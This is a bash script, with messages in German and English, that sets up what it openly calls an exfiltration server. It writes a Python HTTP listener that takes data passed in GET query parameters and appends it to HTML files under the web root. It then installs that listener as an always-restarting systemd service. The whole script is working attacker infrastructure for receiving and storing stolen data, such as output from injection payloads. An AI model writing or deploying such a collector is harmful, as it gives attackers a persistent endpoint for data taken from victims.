#!/bin/bash

# Path and Filename
SERVER_DIR="/var/www/html/uploads"
SERVER_FILE="$SERVER_DIR/server.py"
SERVICE_FILE="/etc/systemd/system/exfilserver.service"

echo "[*] Erstelle Verzeichnis $SERVER_DIR (falls nicht vorhanden)"
mkdir -p "$SERVER_DIR"

echo "[*] Erstelle Python-Webserver unter $SERVER_FILE"

cat > "$SERVER_FILE" << 'EOF'
#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import html
import os
import datetime

PORT = 10000

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        filename = os.path.basename(params.get('datei', ['default.html'])[0])
        data = params.get('data', [''])[0]

        filepath = os.path.join(os.getcwd(), filename)
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        entry = f"""<div style="border:1px solid #ccc; padding:10px; margin:10px;">
<pre>{html.escape(data)}</pre>
<small>Empfangen am: {timestamp}</small>
</div>\n"""

        if not os.path.exists(filepath):
            with open(filepath, 'w') as f:
                f.write("<html><body>\n" + entry + "</body></html>")
            msg = f"Neue Datei erstellt: {filename}"
        else:
            with open(filepath, 'r') as f:
                content = f.read()
            content = content.replace("</body></html>", entry + "</body></html>")
            with open(filepath, 'w') as f:
                f.write(content)
            msg = f"Daten ergänzt in Datei: {filename}"

        self.send_response(200)
        self.end_headers()
        self.wfile.write(msg.encode('utf-8'))

if __name__ == '__main__':
    print(f"Starte Exfiltrationsserver auf Port {PORT}")
    HTTPServer(('', PORT), RequestHandler).serve_forever()
EOF

chmod +x "$SERVER_FILE"

echo "[*] Create systemd-Service path: $SERVICE_FILE"

cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=Exfiltration HTTP Server
After=network.target

[Service]
ExecStart=/usr/bin/python3 $SERVER_FILE
WorkingDirectory=$SERVER_DIR
Restart=always
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

echo "[*] Reload systemd and activate service"

systemctl daemon-reexec
systemctl daemon-reload
systemctl enable exfilserver.service
systemctl restart exfilserver.service

echo "[✓] Exfiltrationsserver installed and running!"
systemctl status exfilserver.service --no-pager
